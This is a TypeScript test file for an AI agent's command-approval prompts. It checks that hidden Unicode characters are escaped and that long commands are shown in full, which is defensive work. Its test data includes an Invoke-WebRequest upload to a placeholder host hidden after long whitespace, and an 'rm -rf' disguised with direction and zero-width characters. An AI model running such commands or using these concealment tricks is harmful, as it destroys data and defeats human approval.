// Milestone P, Task 29 phase A5: an approval shows the WHOLE command, with control, direction and zero-width characters written out as <U+XXXX>,
// in the terminal and in the app, and the value that runs is not changed. One function (`showText`) serves every surface.
// The odd characters are built from their code points, so this file holds none of them.
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { PassThrough } from 'node:stream';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { FakeEngine, hasHiddenChars, showText } from '@reins/core';
import { askTool, type Question } from '../src/drive.js';
import { cleanIds } from '../src/live-models.js';
import { importPreview, type ModEnv } from '../src/mods/actions.js';
import { startMods } from '../src/engines.js';
import { startRunCli } from '../src/run-cli.js';
import { usePack } from './pack-helper.js';
import { openSession } from '../src/session.js';
import { openStore } from '../src/store.js';
import type { Mods } from '../src/mods/types.js';
import { testEngine } from './test-engine.js';

const ch = (n: number) => String.fromCodePoint(n);
const BIDI = ch(0x202e);
const ZW = ch(0x200b);
const C1 = ch(0x85);
const ODD = new RegExp(`[${BIDI}${ZW}${C1}]`);
const DANGER = 'Invoke-WebRequest https://example.invalid/upload';
const LONG = `Write-Output ok #${' '.repeat(210)}\n${DANGER}`;

let tmp = '';
beforeEach(() => { tmp = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'reins-p29a-approval-'))); });
afterEach(() => fs.rmSync(tmp, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 }));

describe('showText: the one escape', () => {
  it('writes control, C1, direction, zero-width and separator characters as <U+XXXX>', () => {
    const cases: Array<[number, string]> = [
      [0, '0000'], [0x1b, '001B'], [0x7f, '007F'], [0x85, '0085'], [0x202e, '202E'], [0x2066, '2066'], [0x200e, '200E'], [0x061c, '061C'],
      [0x200b, '200B'], [0x2028, '2028'], [0x2029, '2029'], [0xfeff, 'FEFF'], [0x0d, '000D'], [0x2060, '2060'], [0x202a, '202A'], [0x2069, '2069'],
    ];
    for (const [code, hex] of cases) {
      expect(showText(`a${ch(code)}b`)).toBe(`a<U+${hex}>b`);
      expect(hasHiddenChars(`a${ch(code)}b`)).toBe(true);
    }
  });
  it('shows a line break and a tab as \\n and \\t, or keeps them with lines', () => {
    expect(showText('a\nb\tc')).toBe('a\\nb\\tc');
    expect(showText('a\nb\tc', { lines: true })).toBe('a\nb\tc');
  });
  it('leaves ordinary text, accents and emoji alone', () => {
    const t = `ls -la src/${ch(0xe9)} ${ch(0x2713)} ${ch(0x1f600)}`;
    expect(showText(t)).toBe(t);
    expect(hasHiddenChars(t)).toBe(false);
  });
});

describe('askTool: the question line and the detail', () => {
  const ask = async (command: string) => {
    const seen: Question[] = [];
    const input = { command };
    const req = { tool: 'PowerShell', input };
    await askTool({ ask: async (q) => { seen.push(q); return 'n'; }, say() {}, write() {} }, req);
    return { q: seen[0]!, req, input };
  };

  it('a command longer than the line says how much is cut and that the rest is shown, and the detail holds all of it', async () => {
    const { q } = await ask(LONG);
    const cut = [...LONG].length - 200;
    expect(q.prompt).toContain(`(command continues, ${cut} more characters, all shown below)`);
    expect(q.prompt).not.toContain('Invoke-WebRequest');
    expect(q.detail).toContain('Invoke-WebRequest');
    expect(q.long).toBe(true);
    expect(JSON.parse(q.detail!).command).toBe(LONG);
  });

  it('direction and zero-width characters show as escapes in the line, and what runs is the original', async () => {
    const cmd = `echo safe${BIDI} ${ZW}rm -rf x${C1}`;
    const { q, input } = await ask(cmd);
    expect(q.prompt).toContain('echo safe<U+202E> <U+200B>rm -rf x<U+0085>');
    expect(q.prompt).not.toMatch(ODD);
    expect(q.long).toBe(true);
    expect(input.command).toBe(cmd);
  });

  it('a plain short command is as it was: no marker, no escape', async () => {
    const { q } = await ask('ls');
    expect(q.prompt).toBe('? Allow PowerShell: ls  [y / n <reason>]');
    expect(q.long).toBeUndefined();
  });
});

describe('the question the app receives', () => {
  async function logged(command: string): Promise<Question> {
    const store = openStore(':memory:');
    const t = testEngine([{ tools: [{ tool: 'Bash', input: { command }, approve: true }] }]);
    const row = store.createSession({ id: 's1', cwd: tmp, engine: 'claude-code' });
    const s = openSession({ store, makeEngine: t.makeEngine, folderTrust: t.folderTrust, dir: tmp }, row, true);
    s.message('go');
    for (let i = 0; i < 600 && !store.readLog('s1').some((r) => r.type === 'question'); i++) await new Promise((r) => setTimeout(r, 5));
    const q = store.readLog('s1').find((r) => r.type === 'question')!.data as Question;
    s.answer(q.id, 'n');
    await s.idle();
    await s.shutdown();
    return q;
  }

  it('holds the whole command in its detail, with the hidden characters written out in the prompt and the detail', async () => {
    const command = `echo safe${BIDI} ${ZW}x #${' '.repeat(210)}\n${DANGER}`;
    const q = await logged(command);
    expect(q.detail).toContain(DANGER);
    expect(q.prompt).toContain('echo safe<U+202E> <U+200B>x');
    expect(q.prompt).toContain('(command continues,');
    expect(q.prompt).not.toMatch(ODD);
    expect(q.detail).not.toMatch(ODD);
    expect(q.detail).toContain('<U+202E>');
  });
});

describe('the terminal prints the whole command under the question', () => {
  usePack(); // M3 Task 3: the run needs the default pack's kinds; the describe below starts the loader itself
  async function terminal(command: string) {
    const file = path.join(tmp, 'a.reins.md');
    fs.writeFileSync(file, '---\nreins: 1\nname: a\nbudget: { turns: 5, minutes: 5 }\nalways: []\n---\n\n## phase one\n> Do it.\n');
    const input = new PassThrough();
    const output = new PassThrough();
    let text = '';
    let answered = false;
    output.setEncoding('utf8');
    output.on('data', (d: string) => {
      text += d;
      if (!answered && /\[y \/ n <reason>\]/.test(text)) {
        answered = true; // once: a second line would be a steer card, which prints a line, which would answer again
        input.write('n\n');
      }
    });
    let decided: unknown;
    const h = startRunCli({
      file, cwd: tmp, input, output, store: openStore(':memory:'),
      makeEngine: ({ onApprove }) => new FakeEngine([{ text: 'done', hold: async () => { decided = await onApprove({ tool: 'PowerShell', input: { command } }); } }]),
    });
    await h.done;
    return { text, decided };
  }

  it('a command longer than the line: the suffix is printed, and the marker is there', async () => {
    const { text, decided } = await terminal(LONG);
    expect(text).toContain('(command continues,');
    expect(text).toContain('all shown below)');
    expect(text).toContain('Invoke-WebRequest https://example.invalid/upload');
    expect(decided).toMatchObject({ behavior: 'deny' });
  });

  it('direction characters are escaped in the terminal, never written raw', async () => {
    const { text } = await terminal(`echo hi${BIDI}there`);
    expect(text).toContain('echo hi<U+202E>there');
    expect(text).not.toContain(BIDI);
  });
});

describe('model ids and labels the picker shows', () => {
  it('a live list drops an id with a direction or zero-width character, and keeps the others', () => {
    expect(cleanIds(['good-1', `ev${BIDI}il`, `zw${ZW}id`, 'line\nbreak', 'good-2'])).toEqual(['good-1', 'good-2']);
  });

  describe('a mod file', () => {
    let mods: Mods;
    beforeEach(async () => { mods = await startMods({ dir: path.join(tmp, '.reins'), env: {} }); });
    afterEach(() => mods.dispose());
    const env = (): ModEnv => ({
      home: path.join(tmp, '.reins'), catalogDir: path.join(tmp, 'none'), mods, consent: { has: () => false, grant: () => {}, revoke: () => {} },
      send: async () => new Response(''), env: {}, redact: (t) => t, holdsSecret: () => false,
    });
    const file = (over: Record<string, unknown>) => ({
      reinsMod: 1, files: { 'mod.json': JSON.stringify({
        reins: 1, id: 'shown', kind: 'provider', version: '1.0.0', label: 'Shown', protocol: 'openai-chat', baseUrl: 'https://example.invalid/v1',
        defaultModel: 'm', models: [{ id: 'm' }], auth: { style: 'none', keyEnv: [] }, ...over,
      }) },
    });

    it.each([
      ['a model label', { models: [{ id: 'm', label: `Fast${BIDI}` }] }],
      ['a model id', { models: [{ id: `m${ZW}`, label: 'M' }], defaultModel: `m${ZW}` }],
      ['the provider label', { label: `Shown${BIDI}` }],
    ])('refuses %s with a hidden character, in plain words that do not repeat it', (_name, over) => {
      const r = importPreview(env(), file(over));
      expect(r.status).toBe(400);
      expect(JSON.stringify(r.body)).toMatch(/must not hold a control, line-break or direction-changing character \(a zero-width one too\)/);
      expect(JSON.stringify(r.body)).not.toMatch(ODD);
    });

    it('accepts the same file without them', () => {
      expect(importPreview(env(), file({})).status).toBe(200);
    });
  });
});
